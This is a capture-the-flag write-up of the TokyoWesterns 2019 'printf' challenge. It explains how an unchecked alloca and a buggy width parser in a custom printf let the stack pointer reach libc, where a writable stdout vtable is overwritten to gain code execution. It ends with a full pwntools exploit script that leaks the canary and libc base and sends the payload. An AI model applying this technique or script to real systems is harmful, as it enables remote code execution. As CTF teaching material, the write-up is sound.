printf was a pretty typical pwn task: you get binary, libc, network address,
and you have to gain an RCE. The vulnerability is an unsafe `alloca` which
allows one to cross the gap between stack and libraries.

## Binary

The gist of the `main` function is as follows:  
```c  
char buf[256];  
my_printf("What's your name?");  
v5 = read(0, buf, 0x100uLL);  
buf[v5 - 1] = 0;  
for (i = 0; i < v5 - 1; ++i) {  
 if (!isprint(buf[i]))  
   _exit(1);  
}  
my_printf("Hi, ");  
my_printf(buf);  
my_printf("Do you leave a comment?");  
buf[(signed int)((unsigned __int64)read(0, buf, 0x100uLL) - 1)] = 0;  
my_printf(buf);  
```

So `printf` is called twice with fully controllable format argument. The first
time the string is restricted to printable characters, and the second time
there're no restrictions.

Any CTF veteran knows that it looks like a classic format string bug, which
are now relatively rare compared to heap tasks :).

Obviously, you can leak stack variables using the `%lx|%lx|%lx|...` format
string. That defeats ASLR of stack, libc and binary itself.

However, the `printf` implementation is custom. It lacks `%n` specifier, and
have some unusual bugs instead.

It prints the string in two passes. In the first pass, it calculates the
string length, and allocates the buffer with `alloca`. During the second pass,
the data is printed to the buffer, and then the buffer is written out with
`puts`.

The bug is that the argument of `alloca` is unchecked. `alloca` compiles to
`sub rsp, rax` without any checks whatsoever. We can't make the length
negative, as it's thoroughly checked. But by specifying large width (e.g.
`%980794739896d`) we can make it very large so the stack pointer crosses the
unmapped gap between the stack and libc.

This might seem to be non-exploitable, as the function will crash when
attempting to fill the entire gap between libc and stack with data. Not to
mention that it will corrupt much more data than we want during the write to
libc.

Fortunately, the implemenation of width specifier is buggy, as it effectively
ignored during the second pass:  
```c  
v27 = number_of_digits(&fmt_[i_fmt]);  
i_fmt += v27;  
v55.width = my_atoi(&fmt_[i_fmt]);  
```

Here `i_fmt` should've been incremented _after_ the `atoi`. The way it's
written, however, the string that follows the width is interpreted as integer
instead. What follows the integer is not an integer, so `atoi` returns zero.

## Exploitation

How to exploit this, though?

The glibc is Ubuntu GLIBC 2.29-0ubuntu2, which corresponds to Ubuntu 19.04,
which is very new.

So there's no easy way to overwrite things like `atexit` handlers, stdout
virtual table, etc., as they're either mangled or checked.

For example, here's IO table being write-protected on my system:  
```  
pwndbg> p ((struct _IO_FILE_plus*)stdout)->vtable  
$8 = (const struct _IO_jump_t *) 0x7ffff7dcd360 <_IO_file_jumps>  
pwndbg> p _IO_file_jumps  
$9 = {  
 __dummy = 0,  
 __dummy2 = 0,  
 __finish = 0x7ffff7a8aba0 <_IO_new_file_finish>,  
 __overflow = 0x7ffff7a8b700 <_IO_new_file_overflow>,  
 __underflow = 0x7ffff7a8b400 <_IO_new_file_underflow>,  
 __uflow = 0x7ffff7a8c8e0 <__GI__IO_default_uflow>,  
 __pbackfail = 0x7ffff7a8e0e0 <__GI__IO_default_pbackfail>,  
 __xsputn = 0x7ffff7a8a6e0 <_IO_new_file_xsputn>,  
 __xsgetn = 0x7ffff7a8a200 <__GI__IO_file_xsgetn>,  
 __seekoff = 0x7ffff7a899e0 <_IO_new_file_seekoff>,  
 __seekpos = 0x7ffff7a8cd60 <_IO_default_seekpos>,  
 __setbuf = 0x7ffff7a89140 <_IO_new_file_setbuf>,  
 __sync = 0x7ffff7a88fe0 <_IO_new_file_sync>,  
 __doallocate = 0x7ffff7a7b9a0 <__GI__IO_file_doallocate>,  
 __read = 0x7ffff7a8a680 <__GI__IO_file_read>,  
 __write = 0x7ffff7a89ff0 <_IO_new_file_write>,  
 __seek = 0x7ffff7a89680 <__GI__IO_file_seek>,  
 __close = 0x7ffff7a89100 <__GI__IO_file_close>,  
 __stat = 0x7ffff7a89fb0 <__GI__IO_file_stat>,  
 __showmanyc = 0x7ffff7a8e340 <_IO_default_showmanyc>,  
 __imbue = 0x7ffff7a8e380 <_IO_default_imbue>  
}  
pwndbg> vmmap 0x7ffff7dcd360  
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
   0x7ffff7dcc000     0x7ffff7dd0000 r--p     4000 1c2000 /lib64/libc-2.29.so  
```

But let's re-check the binary provided with the task, _just in case_:  
```  
pwndbg> p &_IO_file_jumps  
$1 = (<data variable, no debug info> *) 0x7ffff7fc0560 <_IO_file_jumps>  
pwndbg> vmmap  0x7ffff7fc0560  
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
   0x7ffff7fbe000     0x7ffff7fc1000 rw-p     3000 1e3000
/home/wgh/ctf/tokyowesterns2019/printf/libc.so.6  
```

Wait, what, what, what? Why is default `FILE *` vtable is writable here?
This's supposed to be fixed a long time ago. Honestly, I have no idea why it
happened. The checksum corresponds to the correct Ubuntu package, we're not
dealing with custom build glibc. I don't have an answer.

Anyway, we can overwrite some stdout function pointers and gain RIP control
when `puts` is called. As usual, one-gadget-RCE can be employed.

The exploit is somewhat unstable locally, but works better when run against
the remote server (probably due to different stack layout regarding
environment variables, as it happens relatively often).

```python  
#!/usr/bin/env python2

from __future__ import print_function

from pwn import *

LOCAL = False  
#LOCAL = True

context.binary =
"./printf-60b0fcfbbb43400426aeae512008bab56879155df25c54037c1304227c43dab4"  
context.log_level = "debug"

libc_start_main_leak_offset = 7019 + 0x25000  
libc_filejumps_underflow_offset = 9600  
libc = ELF("libc.so.6")

if LOCAL:  
   p = process(["./ld-linux-x86-64.so.2", "--library-path", ".",
"./printf-60b0fcfbbb43400426aeae512008bab56879155df25c54037c1304227c43dab4"])  
else:  
   p = remote("printf.chal.ctf.westerns.tokyo", 10001)

def get_payload1():  
   res = " ".join("%lx" for _ in xrange(64))  
   assert len(res) <= 255  
   return res

p.recvuntil("What's your name?")  
p.sendline(get_payload1())  
p.recvuntil("Hi, ")  
leaks = p.recvuntil("Do you leave a comment?", drop=True)  
leaks = [int(x, 16) for x in leaks.split()]

offset_info = {  
   40: "main (canary)",  
   41: "main (RBP)",  
   42: "main RA (__libc_start_main)",  
}  
for i, addr in enumerate(leaks):  
   extra = ""  
   if i in offset_info:  
       extra = " %s" % offset_info[i]

log.info("%d: 0x%016x%s", i, addr, extra)

leaked_canary = leaks[40]  
leaked_libc = leaks[42] - libc_start_main_leak_offset  
main_buf = leaks[39] - 496 + 8

log.info("canary: 0x%016x", leaked_canary)  
log.info("libc base: 0x%016x", leaked_libc)  
log.info("main_buf: 0x%016x", main_buf)

#gdb.attach(p, """  
#    breakrva 0x1C85
printf-60b0fcfbbb43400426aeae512008bab56879155df25c54037c1304227c43dab4  
#    breakrva 0x1C97
printf-60b0fcfbbb43400426aeae512008bab56879155df25c54037c1304227c43dab4  
#  
#    b system  
#""")

desired_address = leaked_libc + 0x1e6588 - 0x10

one_gadget = leaked_libc + 0x106ef8  
#one_gadget = leaked_libc + libc.sym["system"]  
log.info("one_gadget=0x%016x", one_gadget)

payload = b""  
payload += "%{}d".format(main_buf - 416 - desired_address)  
payload += "A" * (0x10-2)  
payload += p64(one_gadget).rstrip(b'\0')

log.info("len(payload)=%d", len(payload))

p.sendline(payload)

p.interactive()  
```

Original writeup (https://blog.bushwhackers.ru/tokyo2019-printf/).